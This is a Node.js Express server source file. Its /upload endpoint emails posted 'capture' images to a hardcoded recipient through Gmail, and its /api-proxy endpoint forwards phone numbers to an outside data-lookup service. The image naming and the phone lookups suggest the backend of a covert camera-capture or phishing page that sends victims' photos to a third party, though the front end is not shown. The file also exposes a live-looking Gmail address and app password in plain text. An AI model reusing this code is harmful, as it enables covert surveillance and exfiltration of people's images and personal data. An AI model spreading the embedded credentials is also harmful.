import express from "express";
import path from "path";
import nodemailer from "nodemailer";
import bodyParser from "body-parser";
import fetch from "node-fetch";

const app = express();
const __dirname = path.resolve();

const SENDER_EMAIL = "nothingisimpossiblebrother@gmail.com";  
const APP_PASSWORD = "agntmvxlgazptvow";
const RECIPIENTS = ["sajj31665@gmail.com"];

app.use(bodyParser.json({ limit: "20mb" }));
app.use(express.static("public")); 

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});


app.post("/upload", async (req, res) => {
  try {
    const imgData = req.body.image || "";
    const base64Match = imgData.match(/^data:image\/png;base64,(.*)$/);

    if (!base64Match) {
      return res.status(400).json({ status: "error", msg: "invalid data" });
    }

    const imgBuffer = Buffer.from(base64Match[1], "base64");

    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: SENDER_EMAIL,
        pass: APP_PASSWORD,
      },
    });

    for (const recipient of RECIPIENTS) {
      await transporter.sendMail({
        from: SENDER_EMAIL,
        to: recipient,
        subject: "New capture received 📸",
        text: "New image attached.",
        attachments: [
          {
            filename: `capture.png`,
            content: imgBuffer,
          },
        ],
      });
    }

    res.json({ status: "ok", sent_to: RECIPIENTS.length });
  } catch (err) {
    res.status(500).json({ status: "error", msg: err.message });
  }
});


app.get("/api-proxy", async (req, res) => {
  const phone = req.query.phone;
  if (!phone) {
    return res.status(400).json({ error: "phone parameter missing" });
  }

  const apiUrl = `https://api.impossible-world.xyz/api/data?phone=${phone}`;
  try {
    const resp = await fetch(apiUrl);
    const data = await resp.json();
    res.json(data);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

const port = process.env.PORT || 5000;
app.listen(port, () => console.log(`Server running on port ${port}`));